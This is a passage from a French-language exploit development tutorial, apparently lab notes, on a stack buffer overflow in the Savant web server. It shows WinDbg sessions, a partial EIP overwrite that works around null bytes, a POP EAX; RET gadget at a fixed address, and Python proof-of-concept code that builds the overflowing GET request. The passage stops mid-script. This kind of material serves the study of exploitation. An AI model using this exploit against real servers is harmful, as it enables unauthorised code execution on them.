<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="n">42424242</span> <span class="p">??</span>              <span class="p">???</span>
</code></pre></div>
<p><code>253</code> est donc l'offset exact pour réécrire <code>EIP</code>.</p>
<h3 id="reecriture-partielle-de-eip">Réécriture partielle de EIP</h3>
<p>On identifie que le seul module charge contient un <em>null byte</em> au sein de son adresse de début. Les <em>null byte</em> sont des mauvais caractères, surtout dans notre cas ou le <em>buffer</em> est traite comme un <em>string</em>. Les <em>null byte</em> entraine la fin du string.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="p">.</span><span class="n">load</span> <span class="n">narly</span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="c">#</span>
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">nmod</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">00400000</span> <span class="n">00452000</span> <span class="n">Savant</span>               <span class="p">/</span><span class="n">SafeSEH</span> <span class="n">OFF</span>                <span class="n">C</span><span class="p">:\</span><span class="n">Savant</span><span class="p">\</span><span class="n">Savant</span><span class="p">.</span><span class="n">exe</span>
</code></pre></div>
<p>Aucun autre module n'est disponible en dehors de l'exécutable principal. Cependant cet exécutable contient des <em>null bytes</em> dans son adresse.</p>
<blockquote>
<p>Note : Choisir un module Microsoft impliquerait que l'adresse change à chaque version de Windows et il faudrait travailler à contourner les protections mises en place dans les binaires de Microsoft</p>
</blockquote>
<p>On se souvient que notre buffer est traité comme un string en mémoire et qu'il finit donc par <code>00</code> pour terminer le string. On confirme le comportement en relançant l'exploit :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="p">(</span><span class="n">1638</span><span class="p">.</span><span class="n">166c</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="p">[...]</span>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="n">eax</span><span class="p">=</span><span class="n">ffffffff</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01835778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">743857dc</span> <span class="n">edx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">esi</span><span class="p">=</span><span class="n">01835778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="n">eip</span><span class="p">=</span><span class="n">42424242</span> <span class="n">esp</span><span class="p">=</span><span class="n">0456ea2c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010206</span>
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="n">42424242</span> <span class="p">??</span>              <span class="p">???</span>
<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="c">#</span>
<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">dds</span> <span class="nv">@esp</span> <span class="n">L4</span>
<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="n">0456ea2c</span>  <span class="n">00434343</span> <span class="n">Savant</span><span class="p">+</span><span class="n">0x34343</span>
<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="n">0456ea30</span>  <span class="n">0456ea84</span>
</code></pre></div>
<p>Le <em>buffer</em> est bien terminé par un caractère <em>null</em>, permettant d'utiliser la technique réécriture partielle de <code>EIP</code> ou <em>partial EIP overwrite</em>.</p>
<p>Comme l'exécutable de <code>Savant.exe</code> est mappe dans une gamme d'adresse qui commence avec un <em>null byte</em> on pourrait utiliser le string <em>null</em> de fin de chaine comme faisant partie de notre réécriture de <code>EIP</code>. Ceci nous permettra de rediriger le flot d'exécution vers n'importe quelle instruction dans le module <code>Savant.exe</code>.</p>
<p>Un effet de bord de la réécriture partiel de <code>EIP</code> est que l'on ne peut stocker aucune autre data après l'adresse de retour, car le <em>null byte</em> va terminer le string.</p>
<p>On avait remarqué que le deuxième <code>DWORD</code> sur la pile au moment du crash pointe très proche du pointeur de pile (<code>ESP</code>). Il pointe toujours sur la méthode <code>HTTP</code> et les données qui suivent :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">dds</span> <span class="nv">@esp</span> <span class="n">L2</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">0470ea2c</span>  <span class="n">00414141</span> <span class="n">Savant</span><span class="p">+</span><span class="n">0x14141</span>
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">0470ea30</span>  <span class="n">0470ea84</span>                                                          <span class="c"># DEUXIEME DWORD</span>
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c">#</span>
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">dc</span> <span class="n">poi</span><span class="p">(</span><span class="n">esp</span><span class="p">+</span><span class="n">4</span><span class="p">)</span>
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="n">0470ea84</span>  <span class="n">00544547</span> <span class="n">00000000</span> <span class="n">00000000</span> <span class="n">00000000</span>  <span class="n">GET</span><span class="p">.............</span>             <span class="c"># METHODE HTTP</span>
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="n">0470ea94</span>  <span class="n">00000000</span> <span class="n">00000000</span> <span class="n">4141412f</span> <span class="n">41414141</span>  <span class="p">......../</span><span class="n">AAAAAAA</span>
<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="n">0470eaa4</span>  <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span>  <span class="n">AAAAAAAAAAAAAAAA</span>
</code></pre></div>
<p>Il faut donc trouver une séquence d'instruction qui nous permettrait de rediriger le flot d'exécution vers cette ce deuxième DWORD. On peut utiliser <code>POP R32; RET</code> :</p>
<ul>
<li><code>POP R32</code> va enlever le premier <code>DWORD</code> de la pile ce qui va entrainer <code>ESP</code> a pointer vers l'adresse mémoire qui contient notre buffer qui commence avec la méthode <code>HTTP GET</code><ul>
<li><code>R32</code> fait référence à un registre arbitraire de 32b</li>
</ul>
</li>
<li><code>RET</code> devrait être placé au début de la méthode HTTP</li>
</ul>
<p>Cela voudrait dire qu'il faudrait exécuter les instructions assembleur générées par les <em>opcodes</em> de la méthode <code>GET</code>. La méthode <code>GET</code> a généré les opcodes et les instructions ASM suivants :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">u</span> <span class="n">poi</span><span class="p">(</span><span class="nv">@esp</span><span class="p">+</span><span class="n">0x04</span><span class="p">)</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">0460ea84</span> <span class="n">47</span>              <span class="n">inc</span>     <span class="n">edi</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="n">0460ea85</span> <span class="n">45</span>              <span class="n">inc</span>     <span class="nb">ebp</span>
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="n">0460ea86</span> <span class="n">54</span>              <span class="n">push</span>    <span class="n">esp</span>
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="n">0460ea87</span> <span class="n">0000</span>            <span class="n">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="no">[eax]</span><span class="p">,</span><span class="n">al</span>
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="n">0460ea89</span> <span class="n">0000</span>            <span class="n">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="no">[eax]</span><span class="p">,</span><span class="n">al</span>
<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="n">0460ea8b</span> <span class="n">0000</span>            <span class="n">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="no">[eax]</span><span class="p">,</span><span class="n">al</span>
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="n">0460ea8d</span> <span class="n">0000</span>            <span class="n">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="no">[eax]</span><span class="p">,</span><span class="n">al</span>
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="n">0460ea8f</span> <span class="n">0000</span>            <span class="n">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="no">[eax]</span><span class="p">,</span><span class="n">al</span>
</code></pre></div>
<ul>
<li>
<p>Les instructions suivantes ne sont pas impactantes pour notre flot et n'entrainent pas de violation d'accès</p>
<ul>
<li><code>inc     edi</code> - <code>inc     ebp</code> et <code>push    esp</code></li>
<li>Elles résultent des opcodes <code>544547</code></li>
</ul>
</li>
<li>
<p>La dernière instruction <code>add     byte ptr [eax],al</code> est une addition qui vise a ajouter la valeur du registre <code>al</code> a la valeur sur laquelle <code>EAX</code> pointe</p>
<ul>
<li>Peut être problématique, car assume que l'adresse sur laquelle <code>EAX</code> pointe est une adresse mémoire valide</li>
<li>Généré par l'opcode <code>00</code></li>
</ul>
</li>
</ul>
<p>Les instructions <code>POP R32;RET</code> vont rediriger le flot d'exécution vers notre buffer. L'instruction <code>POP</code> de la séquence nous permettrait de placer le DWORD sur lequel pointe <code>ESP</code> dans le registre de notre choix. Si on peut trouver une instruction tel que <code>POP EAX;RET</code> on va pouvoir garantir que <code>EAX</code> pointe vers une adresse existante et valide.</p>
<p>Le premier <em>DWORD</em> dans la pile pointe vers un espace mémoire faisant partie de la pile et donc un espace mémoire valide :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">dds</span> <span class="nv">@esp</span> <span class="n">L5</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">0460ea2c</span>  <span class="n">0460fe70</span>
<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">0460ea30</span>  <span class="n">0460ea84</span>
<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="c">#</span>
<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">teb</span>
<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="n">TEB</span> <span class="n">at</span> <span class="n">00244000</span>
<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>    <span class="n">ExceptionList</span><span class="p">:</span>        <span class="n">0460ff70</span>
<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>    <span class="n">StackBase</span><span class="p">:</span>            <span class="n">04610000</span>
<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>    <span class="n">StackLimit</span><span class="p">:</span>           <span class="n">0460c000</span>
<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="p">[...]</span>
</code></pre></div>
<p>Génération des <em>opcodes</em> de l'instruction <code>POP EAX;RET</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="p">$</span> <span class="n">msf-nasm_shell</span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">pop</span> <span class="n">eax</span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="n">00000000</span>  <span class="n">58</span>                <span class="n">pop</span> <span class="n">eax</span>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">ret</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">00000000</span>  <span class="n">C3</span>   
</code></pre></div>
<p>On cherche ces <em>opcodes</em> dans le module <code>Savant.exe</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">lm</span> <span class="n">m</span> <span class="n">Savant</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">Browse</span> <span class="n">full</span> <span class="n">module</span> <span class="n">list</span>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="nb">start </span>   <span class="k">end</span>        <span class="n">module</span> <span class="n">name</span>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">00400000</span> <span class="n">00452000</span>   <span class="n">Savant</span>   <span class="n">C</span> <span class="p">(</span><span class="n">no</span> <span class="n">symbols</span><span class="p">)</span>           
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">s</span> <span class="p">-[</span><span class="n">1</span><span class="p">]</span><span class="n">b</span> <span class="n">00400000</span> <span class="n">00452000</span> <span class="n">58</span> <span class="n">c3</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="n">0x00418674</span>
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="p">[...]</span>
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">u</span> <span class="n">0x00418674</span> <span class="n">L4</span>
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="n">Savant</span><span class="p">+</span><span class="n">0x18674</span><span class="p">:</span>
<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="n">00418675</span> <span class="n">c3</span>              <span class="n">ret</span>
<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="p">[...]</span>
</code></pre></div>
<p>On modifie la preuve de concept pour positionner l'adresse <code>0x00418674</code> dans le registre <code>EIP</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>
<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">260</span>
<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>
<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;GET /&quot;</span>
<a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">253</span>
<a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x418674</span><span class="p">))</span> <span class="c1"># 0x00418674 : POP EAX ; RET -&gt; EIP</span>
</code></pre></div>
<p>On exécute la nouvelle preuve de concept :</p>
<ul>
<li>Le point d'arrêt est atteint</li>
<li>Le registre <code>EIP</code> est bien initialise a <code>00418674</code> sur <code>POP EAX</code></li>
<li>On avance d'une instruction pour arriver sur <code>RET</code></li>
<li>On avance d'une instruction pour arriver sur <code>INC EDI</code> qui est le début des opcodes génères par la méthode HTTP <code>GET</code></li>
</ul>
<p>En faisant le <code>POP EAX;RET</code> on a bien réussis a retirer le premier DWORD de <code>ESP</code> et a exécuté le deuxième qui pointe sur le shellcode. On retrouve les instructions assembleur découlant des opcodes de la fonction <code>GET</code>. On observe que <code>EAX</code> change de valeur après le <code>POP EAX</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="p">[...]</span>
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="n">Savant</span><span class="p">+</span><span class="n">0x18674</span><span class="p">:</span>
<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="c">#</span>
<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="n">eax</span><span class="p">=</span><span class="n">045bfe70</span>
<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="p">[...]</span>
<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="n">Savant</span><span class="p">+</span><span class="n">0x18675</span><span class="p">:</span>
<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a><span class="n">00418675</span> <span class="n">c3</span>              <span class="n">ret</span>
<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="c">#</span>
<a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a><span class="p">[...]</span>
<a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a><span class="n">045bea84</span> <span class="n">47</span>              <span class="n">inc</span>     <span class="n">edi</span>
<a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a><span class="c">#</span>
<a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">u</span> <span class="nv">@eip</span>
<a id="__codelineno-26-18" name="__codelineno-26-18" href="#__codelineno-26-18"></a><span class="n">045bea84</span> <span class="n">47</span>              <span class="n">inc</span>     <span class="n">edi</span>
<a id="__codelineno-26-19" name="__codelineno-26-19" href="#__codelineno-26-19"></a><span class="n">045bea85</span> <span class="n">45</span>              <span class="n">inc</span>     <span class="nb">ebp</span>
<a id="__codelineno-26-20" name="__codelineno-26-20" href="#__codelineno-26-20"></a><span class="n">045bea86</span> <span class="n">54</span>              <span class="n">push</span>    <span class="n">esp</span>
<a id="__codelineno-26-21" name="__codelineno-26-21" href="#__codelineno-26-21"></a><span class="n">045bea87</span> <span class="n">0000</span>            <span class="n">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="no">[eax]</span><span class="p">,</span><span class="n">al</span>
<a id="__codelineno-26-22" name="__codelineno-26-22" href="#__codelineno-26-22"></a><span class="p">[...]</span>
<a id="__codelineno-26-23" name="__codelineno-26-23" href="#__codelineno-26-23"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">dc</span> <span class="nv">@eip</span>
<a id="__codelineno-26-24" name="__codelineno-26-24" href="#__codelineno-26-24"></a><span class="n">045bea84</span>  <span class="n">00544547</span> <span class="n">00000000</span> <span class="n">00000000</span> <span class="n">00000000</span>  <span class="n">GET</span><span class="p">.............</span>
<a id="__codelineno-26-25" name="__codelineno-26-25" href="#__codelineno-26-25"></a><span class="n">045bea94</span>  <span class="n">00000000</span> <span class="n">00000000</span> <span class="n">4141412f</span> <span class="n">41414141</span>  <span class="p">......../</span><span class="n">AAAAAAA</span>
<a id="__codelineno-26-26" name="__codelineno-26-26" href="#__codelineno-26-26"></a><span class="n">045beaa4</span>  <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span>  <span class="n">AAAAAAAAAAAAAAAA</span>
<a id="__codelineno-26-27" name="__codelineno-26-27" href="#__codelineno-26-27"></a><span class="p">[...]</span>
</code></pre></div>
<p>En faisant <code>POP EAX</code> on s'est assuré que le premier DWORD de <code>ESP</code> soit dans <code>EAX</code> et comme il pointe sur une adresse de la pile <code>EAX</code> ne contiendra pas d'adresse entrainant une violation d'accès. Les instructions découlant de la commande <code>GET</code> peuvent donc s'exécuter sans effet de bord.</p>
<p>Cette méthode fonctionnerait, mais exécuter les opcodes découlant de la fonction <code>HTTP</code> n'est pas très propre. Il existe d'autres options plus élégantes.</p>
<h4 id="modification-de-la-methode-http">Modification de la méthode HTTP</h4>
<p>On souhaite trouver un moyen plus subtil que d'exécuter les opcodes découlant de la fonction HTTP, même si ceux-ci sont maintenant fonctionnels. On veut trouver un moyen plus élégant d'atteindre notre buffer de <code>0x41</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">0</span><span class="p">:</span><span class="n">012</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x00418674</span>
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="c">#</span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="n">0</span><span class="p">:</span><span class="n">012</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="c">#</span>
<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="n">0</span><span class="p">:</span><span class="n">005</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="n">00418675</span> <span class="n">c3</span>              <span class="n">ret</span>
<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="c">#</span>
<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="n">0</span><span class="p">:</span><span class="n">005</span><span class="p">&gt;</span> <span class="n">dc</span> <span class="n">poi</span><span class="p">(</span><span class="nv">@esp</span><span class="p">)</span>
<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="n">046eea84</span>  <span class="n">00544547</span> <span class="n">00000000</span> <span class="n">00000000</span> <span class="n">00000000</span>  <span class="n">GET</span><span class="p">.............</span>
<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="n">046eea94</span>  <span class="n">00000000</span> <span class="n">00000000</span> <span class="n">4141412f</span> <span class="n">41414141</span>  <span class="p">......../</span><span class="n">AAAAAAA</span>
<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a><span class="n">046eeaa4</span>  <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span>  <span class="n">AAAAAAAAAAAAAAAA</span>
<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a><span class="p">[...]</span>
</code></pre></div>
<p>On observe qu'il y a un padding important entre <code>GET</code> et le reste du buffer. On peut supposer que :
- Le buffer utilise pour stocker la méthode HTTP semble avoir été alloué avec une taille fixe
- La taille de la méthode en elle-même ne semble pas être prise en compte ni vérifiée
    * Si elle n'est pas vérifiée, on peut essayer de la remplacer avec des opcodes d'instructions ASM qui permettraient d'atteindre nos <code>0x41</code></p>
<p>Mise à jour de la preuve de concept :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>
<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">260</span>
<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>
<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x43\x43\x43\x43\x43\x43\x43\x43</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot; /&quot;</span>
